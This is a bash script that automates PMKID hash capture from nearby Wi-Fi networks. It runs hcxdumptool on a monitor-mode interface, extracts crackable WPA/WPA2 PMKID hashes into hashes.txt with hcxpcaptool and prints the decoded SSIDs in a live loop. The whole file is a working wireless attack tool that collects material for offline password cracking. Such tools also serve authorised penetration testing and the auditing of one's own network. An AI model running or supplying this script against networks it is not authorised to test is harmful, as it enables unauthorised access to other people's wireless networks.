#!/bin/bash

# trap ctrl-c and call ctrl_c()
trap ctrl_c INT

dir=$(pwd)
GREEN='\033[00;32m'
RED='\033[00;31m'
YELLOW='\033[00;33m'
BLUE='\033[00;34m'
CYAN='\033[00;36m'

ctrl_c() {
	kill $prc
        rm hashdump.pcapng
	rm res.txt
	rm nohup*
	printf "\n$YELLOW Hashes are stored in $dir/hashes.txt\n"
	exit
}

ssidfunc() {
	for ssid in $(cat hashes.txt 2>/dev/null | cut -d "*" -f 4 ) 
       	do 
		ssout=$(echo $ssid|xxd -r -ps)
		text="SSID for PMKID $ssid: $ssout"
		length=${#text}
		line=$(for a in $(seq 1 $length); do echo -n '-'; done)
		echo -e "$YELLOW SSID for PMKID $RED$ssid\e[m: $BLUE$ssout\e[m"
		echo -e "$CYAN $line\e[m"
	done
}
	
nohup hcxdumptool -i wlan0mon -o hashdump.pcapng & 2>&1>/dev/null
prc=$!

while true; do
	clear
	printf "$GREEN =-=-=-Collection PMKID from handshake-=-=-=\e[m\n"
	hcxpcaptool -z hashes.txt hashdump.pcapng 2>&1>/dev/null
	ssidfunc --color=always | tee res.txt
	printf "\n$RED Ctrl+C to exit\e[m\n"
	sleep 3
	printf "" > hashes.txt 2>&1>/dev/null
done
